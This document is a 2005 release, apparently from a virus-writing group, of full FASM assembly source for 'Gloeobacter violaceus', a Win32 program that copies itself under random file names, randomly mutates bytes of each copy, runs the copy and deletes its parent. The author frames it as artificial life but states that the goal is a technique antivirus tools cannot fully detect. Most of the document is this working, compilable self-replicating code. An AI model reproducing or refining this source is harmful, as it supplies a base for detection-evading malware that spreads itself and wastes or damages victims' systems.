  Gloeobacter violaceus
  by Second Part To Hell/[rRlf]
  www.spth.de.vu
  spth@priest.com
  written in May 2005
  in Austria

  I proudly present my very first real Win32 Project.
  Before anything else I have to say that this is neighter a real virus
  nor a real engine. It is a program emulating the nature's mutations.

  I would descripe it as a primitive artificial life form.

  How does it work?
  1) When executed, it get's the own filename and the parent's filename
  2) It sleeps for 1500 + (0..4095) milliseconds
  3) It copies itself to a random filename in the current directory
  4) 1/4 it mutates:
     - Point Mutation: ~68.75%
     - Chromosome Mutation:
       * Chromosome Inversation
       * Chromosome Translocation
       * Chromosome Delection
       * Chromosome Dublication
       * Chromosome Inseration
  5) It executes the new file
  6) With a chance of ~50% it jmps to 2
  7) It deletes the partent's file
  8) It exits it's own process

  Where the hell can you see a primitive artificial life form?

  Well, we can also say, that the project behaves like that:

  1) Birth of the lifeform
  2) Growing up until it can replicate itself
  3/4) Replicate - there may happen mistakes while replicating
  5) Birth of the child
  6) Maybe it makes another child?!
  7) Give me more space - Remove the corpse of the parent
  8) Death of the lifeform

  About the name: I've thought long time about a suitable name,
  and I think I got a right one: 'Gloeobacter violaceus' are very simple
  bacteria, and also one of the very first life form on our world.

  With this code I've (more than) partly realized my idea, which I've
  written down in the article "Code Evolution: Follow nature's example", and
  I think I've succeded.

  Now let me write some lines about it's behaviour when it's executed:
  First I have to say that every mutation may kill the children. But nevermind,
  the same also happens in nature. As I have tested it very well, I've been faced
  with some strange mutations. Let me tell you some: The filename of the child
  was not .exe but something else; sometimes the DOS-Box opened (when the MZ was
  deleted or changed, Windows wanted to run it as a .COM); and the maybe stranges
  thing ever happend while testing was the creation of two file called 'v' and ' '.
  One is 1kB and one is 500kB, I can neighter read, overwrite, delete or do anything
  else with them. And furthermore they have no arguments as creation-time. They are
  just lost space at my HD, but who cares, I dont need these 501kB :)

  My intention in writing this code was, beside of creating an artificial life form,
  making a technique, which CAN NOT be fully detect by AVs. Reason: Every BIT (!)
  can be changed, and there is no way to find out, how the whole code is changed.

  As even the body of the code may be changed, this could also be called metamorphism.
  But I would not call it 'metamorph', as everything is random (the code don't 'know'
  what it does).

  Thanks goes to BlueOwl and Dr3f, who helped me with some problems with Win32 APIs.

  For compiling:
  Delete the into (this!) and use 'flat assembler 1.56'.




;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;  Gloeobacter violaceus ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

include '..\FASM\INCLUDE\win32ax.inc'

.data
systemtime_struct:	       ; for random number
	  dw 0		       ; wYear
	  dw 0		       ; wMonth
	  dw 0		       ; wDayOfWeek
	  dw 0		       ; wDay
	  dw 0		       ; wHour
	  dw 0		       ; wMinute
	  dw 0		       ; wSecond
rnd:	  dw 0		       ; wMilliseconds

rand_name_buffer:		; The random-engine fills this buffer with 8 random (0-255) bytes
	times 8 db 0

rnd_file_name:			; This will contain the filename of the new child
	times 8 db 0
	db '.exe',0

current_file_value:		; Will contain the current running filename
	times 8 db 0
	db '.exe',0

parent_file		dd 0x0		; Buffer for pointer to the parent-file-name
current_file		dd 0x0		; Buffer for pointer to the current running file
file_handle		dd 0x0
file_size		dd 0x0
map_pointer		dd 0x0
map_handle		dd 0x0
change_byte_offset	dd 0x0
change_byte_value	db 0x0

StartUp_struct:
  StartUp_struct_cb		 dd 0
  StartUp_struct_lpReserved	 dd 0
  StartUp_struct_lpDesktop	 dd 0
  StartUp_struct_lpTitle	 dd 0
  StartUp_struct_dwX		 dd 0
  StartUp_struct_dwY		 dd 0
  StartUp_struct_dwXSize	 dd 0
  StartUp_struct_dwYSize	 dd 0
  StartUp_struct_dwXCountChars	 dd 0
  StartUp_struct_dwYCountChars	 dd 0
  StartUp_struct_dwFillAttribute dd 0
  StartUp_struct_dwFlags	 dd 0
  StartUp_struct_wShowWindow	 dw 0
  StartUp_struct_cbReserved2	 dw 0
  StartUp_struct_lpReserved2	 dd 0
  StartUp_struct_hStdInput	 dd 0
  StartUp_struct_hStdOutput	 dd 0
  StartUp_struct_hStdError	 dd 0


ProcessInfo_Struct:
  PROCESS_INFORMATION_hProcess	  dd 0
  PROCESS_INFORMATION_hThread	  dd 0
  PROCESS_INFORMATION_dwProcessId dd 0
  PROCESS_INFORMATION_dwThreadId  dd 0



.code
  start:
	invoke	GetCommandLine		 ; Get the name of the current file

	cmp	byte [eax], '"' 	 ; Compare if first byte is ". As GetCommandLine could be ["filename"] or [filename]
	jne	got_my_name		 ; If no ", then we already have it

       ;;; FIRST EXECUTION ;;;

	inc	eax			 ; Delete first "
	mov	ebx, eax		 ; Save the pointer
  get_my_name:
	inc	ebx			 ; Get next byte
	cmp	byte [ebx], '.' 	 ; Compare the value with a dot
  jne	get_my_name			 ; If not equal, get next letter of the filename

	add	ebx, 4			 ; Get the pointer of the second "
	mov	byte [ebx], 0x0 	 ; Del the second "
	sub	ebx, 4			 ; Go back to the dot
  get_my_name2:
	dec	ebx			 ; Previous letter
	cmp	byte [ebx], '\' 	 ; Check if it's the end of the path (=filestart-1)
  jne	get_my_name2			 ; if not, get another letter

	inc	ebx			 ; delete the '\'
	mov	eax, ebx		 ; eax=ebx=pointer to start of currentfilename

       ;;; END FIRST EXECUTION ;;;

  got_my_name:
	mov	byte [eax+12], 0x0	 ; make a NULL-terminated string
	mov	[current_file], eax	 ; Save the filename of the current running process

	add	eax, 13 		 ; Point to the first letter of the parent
	mov	[parent_file], eax	 ; Save the pointer to the parent

	call	random_number		 ; Get random number
	mov	ecx, [rand_name_buffer]  ; Move a random number to ecx
	and	ecx, 1			 ; Random number between 0 and 1: New counter

	add	ecx, 1			 ; ecx++ (counter: 1 or 2 childs)

create_next_child:
	push	ecx			; Save the counter

	call	random_number		; Renew random numbers
	mov	ebp, 1500		; ebp=1500
	mov	eax, [rand_name_buffer] ; eax=random number
	and	eax, 4095		; eax=0000 0000 0000 0000 0000 ???? ???? ????
	add	ebp, eax		; ebp=1500+(0..4095)
	invoke	Sleep, ebp		; Sleep 1500+(0..4095) ms

	call	get_n_save_random_name			    ; Get a random filename
	invoke	CopyFile, [current_file], rnd_file_name, 0  ; Copy current file to new file with random name

	call   random_number			; Get new random number
	mov    ax, [rand_name_buffer]		; Get them from buffer
	xor    ah, al				; compain 2 bytes
	and    ah, 3				; ???? ???? -> 0000 00??
	cmp    ah, 2				; ah=0000 0010?
	je     evolution			; If yes -> evolution
   noevolution: 				; Code continues here after mutation, if there where any
	call	birthofchild			; Make the child living!
	pop	ecx				; Another child?
loop create_next_child				; If counter>1, create new child!

	cmp	[parent_file], 0x0		; Compare if parent_file = 0 (first execution?)
	je	Death				; If so, no parent killing, as there is no parent!

	invoke	DeleteFile, [parent_file]	; Kill the parent! (sorry mum, sorry dad :D)

   Death:
	invoke	ExitProcess, 0			; Close current process: Death! :)

birthofchild:
	mov	esi, [current_file]		; esi=pointer to current file name
	mov	edi, current_file_value 	; edi=pointer to buffer for current file name
	mov	ecx, 8				; counter: 8 bytes to copy
	rep	movsb				; Move ecx byte from [esi] to [edi]

	mov	byte [current_file_value-1], 0x20	; Delete the 0x0
	invoke	CreateProcess, 0x0, rnd_file_name, 0x0, 0x0, FALSE, 0x0, 0x0, 0x0, StartUp_struct, ProcessInfo_Struct	; Create child-process
	mov	byte [current_file_value-1], 0x0	; Reset the 0x0
ret

random_number:
	pop	edi				; Get value of stack
	push	edi				; Back to the stack
	mov	ecx, 8				; ecx=counter
	mov	dh, 0xAA			; dh: changes in the function and makes the number little bit more random
	mov	dl, 0x87			; same as dh
   random_name_loop:
	push	dx				; Save dx at stack
	push	ecx				; Save counter at stack
	call	random_byte			; Random number in al
	pop	ecx				; get counter
	xor	al, cl				; Counter influences pseudo random number
	pop	dx				; Get dx
	push	ecx
	xor	dx, cx				; Counter influences influncing number
	add	dh, al				; Random number influences influencing number
	sub	dl, al				; Same as dh
	neg	dl				; Neg dl
	xor	dl, dh				; dl XOR dh -> more variability
	xor	al, dl				; random number changes
	sub	ax, di				; value of stack influences random number
	add	ax, dx				; ax+dx
	mov	dl, [rand_name_buffer+ecx-2]
	mov	dh, [rand_name_buffer+ecx-3]	; dx=???? ???? ????? ?????
	sub	al, dl				; al-=dl
	add	al, dh				; al+=dh
	mov	ah, dl				; ah=dl
	push	ax				; AX to stack
	mov	cl, 1				; cl=1
	or	dh, cl				; dh is at least 1 (to reduce chance of result=zero)
	mul	dh				; AL=AX*DH
	pop	cx				; CX=old AX
	push	cx				; To stack again
	add	cl, al				; CL+=AL
	sub	cl, ah				; CL-=AH
	xchg	al, cl				; AL=CL
	mov	cx, bp				; cx=bp
	mul	cl				; AX=AL*CL
	neg	ah				; NEG AH
	xor	al, ah				; xor AL and AH
	pop	cx				; get old AX
	sub	cl, al				; SUB
	add	cl, dl				; cl+=old random number
	sub	al, cl				; al ~=random :)
	pop	ecx				; Get counter
	mov	[rand_name_buffer+ecx-1], al	; Save random letter
   loop random_name_loop

ret

random_name:
	call	random_number			; Get 8 random bytes
	mov	ecx, 8				; counter=8, as we want to do it 8 times

   changetoletter:
	mov	al, [rand_name_buffer+ecx-1]	; Get a letter
	mov	bl, 10				; BL=10
	xor	ah, ah				; AX: 0000 0000 ???? ????
	div	bl				; AL=rnd/10=number between 0 and 25
	add	al, 97				; Add 97 for getting lowercase letters
	mov	[rnd_file_name+ecx-1], al	; Save random letter
   loop changetoletter
ret

random_byte:
	invoke	GetSystemTime, systemtime_struct	; Get first number
	mov	ebx, [rnd-2]				; ebx=number
	add	ebx, edx				; Making it pseudo-independent of time
	sub	ebx, ecx
	xor	ebx, eax
	xchg	bl, bh
	pop	ecx
	push	ecx
	neg	ebx
	xor	ebx, ecx				; ebx=pseudo-indepentend number

	invoke	GetTickCount				; Get second number
	xor	eax, ecx				; eax=number
	neg	ax					; Making it pseudo-independent of time
	xor	eax, edx
	xor	ah, al
	sub	eax, ebp
	add	eax, esi				; eax=pseudo-indepentend number

	xor	eax, ebx				; Compain the numbers -> eax
	mov	ebx, eax				; Save eax
	shr	eax, 8					; e-part -> ax
	xor	ax, bx
	xor	al, ah					; al=number
ret

get_n_save_random_name:
	mov	ebp, 12 				; ebp influences the pseudo-random-number engine too
	call	random_name				; Get a random name
ret

evolution:
;        invoke  MessageBox, 0x0, rnd_file_name, "Code Evolution", 0x0

	invoke	CreateFile, rnd_file_name, 0xC0000000 ,0x1, 0x0, 0x3, 0x0, 0x0		; Open the new created file
	mov	[file_handle], eax							; Save the file handle
	invoke	GetFileSize, [file_handle], file_size					; Get the size of the file
	mov	[file_size], eax							; Low Filesize returned in eax
	invoke	CreateFileMapping, [file_handle], 0x0, PAGE_READWRITE, 0x0, [file_size], 0x0	; Create a Map
	mov	[map_handle], eax								; Save the Map handle

	invoke	MapViewOfFile, [map_handle], FILE_MAP_WRITE, 0x0, 0x0, [file_size]		; Map view of file
	mov	[map_pointer], eax								; Save the pointer of file

	call	random_number				; Get a random number
	mov	al, [rand_name_buffer]			; Radom number in al

; Chances:
; Point-Mutation: ~50%+18.75%=~68.75%
; Each Chromosome Mutation: ~6.25%

	and	al, 1					; al=0000 000?
	cmp	al, 1					; Compare with 1
	je	pointmutation				; If al=1 then jmp pointmutation (change: ~50%)

	mov	al, [rand_name_buffer+4]		; al=new random number
	and	al, 7					; al=0000 0???

	cmp	al, 0					; Compare al with 0
	je	chrom_inversation			; If al=0 make Chromosome Inversation

	cmp	al, 1					; Compare al with 1
	je	chrom_translocation			; If al=1 make Chromosome Translocation

	cmp	al, 2					; Compare al with 2
	je	chrom_delection 			; If al=2 make Chromosome Delection

	cmp	al, 3					; Compare al with 3
	je	chrom_dublication			; If al=2 make Chromosome Dublication

	cmp	al, 4					; Compare al with 4
	je	chrom_inseration			; If al=4 make Chromosome Inseration

	jmp	pointmutation				; Otherwise do Pointmutation (Chance ~18.75%)

   endofmutation:
	invoke	UnmapViewOfFile, [map_pointer]		; Unmap View of File

	invoke	CloseHandle, [map_handle]		; Close Map
	invoke	CloseHandle, [file_handle]		; Close File
jmp	noevolution

pointmutation:					; Mutation: Pointmutation
	call	random_number			; Renew the random numbers
	xor	eax, eax			; eax=0
	mov	ax, [rand_name_buffer]		; eax=0000 0000 0000 0000 ???? ???? ???? ????
	mov	ebx, [file_size]		; ebx=File size
	cmp	eax, ebx			; comparee Random Number with File Size
	jg	pointmutation			; If RN>Filesize then get new random number (=byte to change)

	add	eax, [map_pointer]		; eax=Byte to change in memory
	mov	[change_byte_offset], eax	; Save the offset

	mov	ah, [eax]			; Get the value of the byte
	mov	[change_byte_value], ah 	; Save it

	mov	cl, [rand_name_buffer+5]	; cl=???? ????
	and	cl, 7				; cl=0000 0???
	mov	al, 1				; al=0000 0001
	shl	al, cl				; AL= ? <- |0|0|0|0| |0|0|0|1| -- ?
	mov	esi, [change_byte_offset]	; esi=offset of byte to change
	xor	[esi], al			; XOR byte with AL
;        invoke  MessageBox, 0x0, esi, "Point Mutation", 0x0
jmp	endofmutation

chrom_inversation:				; Mutation: Chromosome Mutation - Inversation
	call	random_number			; Renew the random numbers
	xor	eax, eax			; eax=0
	mov	ax, [rand_name_buffer]		; eax=0000 0000 0000 0000 ???? ???? ???? ????
	mov	ebx, [file_size]		; ebx=Filesize
	sub	ebx, 16 			; ebx-=16 (As we may change two 8 byte parts)
	cmp	eax, ebx			; comparee Random number with Filesize-16
	jg	chrom_inversation		; If RN>Filesize-16 then get new random number (=place to change)

	add	eax, [map_pointer]		; Add the offset of file memory
	mov	[change_byte_offset], eax	; Save the -to-be-changed- offset

	xor	ecx, ecx			; ecx=0
	mov	cx, [rand_name_buffer+2]	; ecx=0000 0000 0000 0000 ???? ???? ???? ????
	and	cx, 7				; ecx=0000 0000 0000 0000 0000 0000 0000 0???
	mov	[change_byte_value], cl 	; Save cl (=How many bytes to change)

	mov	esi, [change_byte_offset]	; ESI=Offset of part 1
	mov	edi, rand_name_buffer		; EDI=Offset of Buffer
	rep	movsb				; part 1 to buffer: REP MOVS m8,m8 Move (E)CX bytes from DS:[(E)SI] to ES:[(E)DI]


	xor	eax, eax			; eax=0
	mov	al, [change_byte_value] 	; eax=Counter (start of part 2)
	add	eax, [change_byte_offset]	; eax+=Offset in memory of part 2

	xor	ecx, ecx			; ecx=0
	mov	cl, [change_byte_value] 	; ecx=Counter

	mov	esi, eax			; ESI=Offset of part 2
	mov	edi, [change_byte_offset]	; EDI=Offset of part 1
	rep	movsb				; part 2 to part 1: REP MOVS m8,m8 Move (E)CX bytes from DS:[(E)SI] to ES:[(E)DI]


	xor	ecx, ecx			; ecx=0
	mov	cl, [change_byte_value] 	; ecx=Counter
	mov	eax, [change_byte_offset]	; eax=Start of part 1
	add	eax, ecx			; eax=Start of part 2

	mov	esi, rand_name_buffer		; ESI=Offset of buffer
	mov	edi, eax			; EDI=Offset of part 2
	rep	movsb				; buffer to part 1

;        invoke  MessageBox, 0x0, "Inversation", "Chromosome Mutation", 0x0
jmp	endofmutation				; Finished Inversation!

chrom_translocation:
	call	random_number			; Renew the random numbers
	xor	eax, eax			; eax=0
	mov	ax, [rand_name_buffer]		; eax=0000 0000 0000 0000 ???? ???? ???? ????
	mov	ebx, [file_size]		; ebx=Filesize
	sub	ebx, 8				; ebx-=8 (As we may change 8 byte)
	cmp	eax, ebx			; Compare Random number with Filesize-8
	jg	chrom_translocation		; If RN>Filesize-8 then get new random number (=place to change)

	add	eax, [map_pointer]		; Add the offset of file memory
	mov	[change_byte_offset], eax	; Save the -to-be-changed- offset

	xor	ecx, ecx			; ecx=0
	mov	cx, [rand_name_buffer+2]	; ecx=0000 0000 0000 0000 ???? ???? ???? ????
	and	cx, 7				; ecx=0000 0000 0000 0000 0000 0000 0000 0???
	mov	[change_byte_value], cl 	; Save cl (=How many bytes to change)

	mov	esi, [change_byte_offset]	; ESI=Offset of source
	mov	edi, rand_name_buffer		; EDI=Offset of Buffer
	rep	movsb				; Code-Part to buffer: MOVS m8,m8 Move (E)CX bytes from DS:[(E)SI] to ES:[(E)DI]

	mov	ecx, [file_size]		; eax=filesize
	add	ecx, [map_pointer]		; eax=End of file in memory
	sub	ecx, [change_byte_offset]	; eax=Bytes after Change_byte_offset

	mov	esi, [change_byte_offset]	; esi=Pointer to change byte
	xor	eax, eax			; eax=0
	mov	al, [change_byte_value] 	; eax=number of bytes to change
	add	esi, eax			; esi=Pointer to end of changing in memory

	mov	edi, [change_byte_offset]	; edi=Offset of changing
	rep	movsb

   chrom_trans_loop:				; Get a offset, where to save the part
	call	random_number			; Renew the random numbers
	xor	eax, eax			; eax=0
	mov	ax, [rand_name_buffer]		; eax=0000 0000 0000 0000 ???? ???? ???? ????
	mov	ebx, [file_size]		; ebx=Filesize
	sub	ebx, 8				; ebx-=8 (As we may change 8 byte)
	cmp	eax, ebx			; Compare Random number with Filesize-8
   jg	chrom_trans_loop			; If RN>Filesize-8 then get new random number (=place to change)

	add	eax, [map_pointer]		; Add the offset of file memory
	mov	[change_byte_offset], eax	; Save offset of changing

	mov	ecx, [map_pointer]		; ecx=Start of file in memory
	add	ecx, [file_size]		; ecx=End of file in memory

	sub	ecx, [change_byte_offset]	; ecx=Bytes after change-place
	xor	eax, eax			; eax=0
	mov	al, [change_byte_value] 	; eax=number of bytes to change
	sub	ecx, eax			; ecx-=number of bytes to change

	mov	esi, [change_byte_offset]	; esi=Offset of changing
	mov	edi, [change_byte_offset]	; edi=offset of changing
	add	edi, eax			; edi=Offset after changing

   chrom_trans_buffer:				; Delete the Code-Part
	mov	al, [esi+ecx]			; al=Value to Replace
	mov	[edi+ecx], al			; Save al
   loop chrom_trans_buffer

;        invoke  MessageBox, 0x0, "Translocation", "Chromosome Mutation", 0x0
jmp	endofmutation

chrom_delection:
	call	random_number			; Renew the random numbers
	xor	eax, eax			; eax=0
	mov	ax, [rand_name_buffer]		; eax=0000 0000 0000 0000 ???? ???? ???? ????
	mov	ebx, [file_size]		; ebx=Filesize
	sub	ebx, 8				; ebx-=8
	cmp	eax, ebx			; comparee Random number with Filesize
	jg	chrom_delection 		; If RN>Filesize-8 then get new random number (=place to change)

	add	eax, [map_pointer]		; Add the offset of file memory
	mov	[change_byte_offset], eax	; Save the pointer

	call	random_number			; Get a random number
	xor	ecx, ecx			; ecx=0
	mov	cl, [rand_name_buffer]		; cl=random number
	and	cl, 7				; cl=0000 0???
	mov	[change_byte_value], cl 	; Save the random number

	mov	ecx, [file_size]		; eax=filesize
	add	ecx, [map_pointer]		; eax=End of file in memory
	sub	ecx, [change_byte_offset]	; eax=Bytes after Change_byte_offset

	mov	esi, [change_byte_offset]	; esi=Pointer to change byte
	xor	eax, eax			; eax=0
	mov	al, [change_byte_value] 	; eax=number of bytes to change
	add	esi, eax			; esi=Pointer to end of changing in memory

	mov	edi, [change_byte_offset]	; edi=Offset of changing
	rep	movsb

;        invoke  MessageBox, 0x0, "Delection", "Chromosome Mutation", 0x0
jmp	endofmutation

chrom_dublication:
	invoke	UnmapViewOfFile, [map_pointer]	; Unmap File, as we need to open it with another size
	invoke	CloseHandle, [map_handle]	; Close Map-Handle

	call	random_number			; Get a random number
	xor	ecx, ecx			; ecx=0
	mov	cl, [rand_name_buffer]		; cl=random number
	and	cl, 7				; cl=0000 0???
	mov	[change_byte_value], cl 	; Save the random number

	add	ecx, [file_size]		; ecx=New filesize
	mov	[file_size], ecx		; Save new filesize
	invoke	CreateFileMapping, [file_handle], 0x0, PAGE_READWRITE, 0x0, [file_size], 0x0
	mov	[map_handle], eax

	invoke	MapViewOfFile, [map_handle], FILE_MAP_WRITE, 0x0, 0x0, [file_size]
	mov	[map_pointer], eax

   chrom_dubl_loop1:
	call	random_number			; Renew the random numbers
	xor	eax, eax			; eax=0
	mov	ax, [rand_name_buffer]		; eax=0000 0000 0000 0000 ???? ???? ???? ????
	mov	ebx, [file_size]		; ebx=Filesize
	sub	ebx, 8				; ebx-=8
	cmp	eax, ebx			; comparee Random number with Filesize
   jg	chrom_dubl_loop1			; If RN>Filesize-8 then get new random number (=place to change)

	add	eax, [map_pointer]		; eax=Pointer to changing part
	mov	[change_byte_offset], eax	; Save the offset

	mov	ecx, [map_pointer]		; ecx=Start of file in memory
	add	ecx, [file_size]		; ecx=End of file in memory

	sub	ecx, [change_byte_offset]	; ecx=Bytes after change-place
	xor	eax, eax			; eax=0
	mov	al, [change_byte_value] 	; eax=number of bytes to change
	sub	ecx, eax			; ecx-=number of bytes to change

	mov	esi, [change_byte_offset]	; esi=Offset of changing
	mov	edi, [change_byte_offset]	; edi=offset of changing
	add	edi, eax			; edi=Offset after changing

   chrom_dubl_buffer:				; Make a buffer
	mov	al, [esi+ecx]			; al=Value to Replace
	mov	[edi+ecx], al			; Save al
   loop chrom_dubl_buffer

	xor	ecx, ecx			; ecx=0
	mov	cl, [change_byte_value] 	; ecx=lenght of string to dublicate
	mov	esi, [change_byte_offset]	; From
	mov	edi, [change_byte_offset]	; To
	add	edi, ecx			; Offset of buffer
	rep	movsb

;        invoke  MessageBox, 0x0, "Dublication", "Chromosome Mutation", 0x0
jmp	endofmutation


chrom_inseration:
	invoke	UnmapViewOfFile, [map_pointer]	; Unmap File, as we need to open it with anothe size
	invoke	CloseHandle, [map_handle]	; Close Map-Handle

	call	random_number			; Get a random number
	xor	ecx, ecx			; ecx=0
	mov	cl, [rand_name_buffer]		; cl=random number
	and	cl, 7				; cl=0000 0???
	mov	[change_byte_value], cl 	; Save the random number

	add	ecx, [file_size]		; ecx=New filesize
	mov	[file_size], ecx		; Save new filesize
	invoke	CreateFileMapping, [file_handle], 0x0, PAGE_READWRITE, 0x0, [file_size], 0x0
	mov	[map_handle], eax

	invoke	MapViewOfFile, [map_handle], FILE_MAP_WRITE, 0x0, 0x0, [file_size]
	mov	[map_pointer], eax

   chrom_inser_loop1:
	call	random_number			; Renew the random numbers
	xor	eax, eax			; eax=0
	mov	ax, [rand_name_buffer]		; eax=0000 0000 0000 0000 ???? ???? ???? ????
	mov	ebx, [file_size]		; ebx=Filesize
	sub	ebx, 8				; ebx-=8
	cmp	eax, ebx			; comparee Random number with Filesize
   jg	chrom_inser_loop1			; If RN>Filesize-8 then get new random number (=place to change)

	add	eax, [map_pointer]		; eax=Pointer to changing part
	mov	[change_byte_offset], eax	; Save the offset

	mov	esi, [change_byte_offset]	; esi=Offset to get the new part
	mov	edi, rand_name_buffer		; edi=where to save
	xor	ecx, ecx			; ecx=0
	mov	cl, [change_byte_value] 	; ecx=How many bytes
	rep	movsb				; Save the part.

   chrom_inser_loop2:
	call	random_number			; Renew the random numbers
	xor	eax, eax			; eax=0
	mov	ax, [rand_name_buffer]		; eax=0000 0000 0000 0000 ???? ???? ???? ????
	mov	ebx, [file_size]		; ebx=Filesize
	sub	ebx, 8				; ebx-=8
	cmp	eax, ebx			; Compare Random number with Filesize
   jg	chrom_inser_loop2			; If RN>Filesize-8 then get new random number (=place to change)

	add	eax, [map_pointer]		; eax=Pointer to changing part
	mov	[change_byte_offset], eax	; Save the offset

	mov	ecx, [map_pointer]		; ecx=Start of file in memory
	add	ecx, [file_size]		; ecx=End of file in memory

	sub	ecx, [change_byte_offset]	; ecx=Bytes after change-place
	xor	eax, eax			; eax=0
	mov	al, [change_byte_value] 	; eax=number of bytes to change
	sub	ecx, eax			; ecx-=number of bytes to change

	mov	esi, [change_byte_offset]	; esi=Offset of changing
	mov	edi, [change_byte_offset]	; edi=offset of changing
	add	edi, eax			; edi=Offset after changing

   chrom_inser_buffer:				; Make a buffer
	mov	al, [esi+ecx]			; al=Value to Replace
	mov	[edi+ecx], al			; Save al
   loop chrom_inser_buffer

	mov	esi, rand_name_buffer		; esi=source
	mov	edi, [change_byte_offset]	; edi=destination
	xor	ecx, ecx			; ecx=0
	mov	cl, [change_byte_value] 	; ecx=length
	rep	movsb				; Write saved part to the new place

;        invoke  MessageBox, 0x0, "Inseration", "Chromosome Mutation", 0x0
jmp	endofmutation

.end start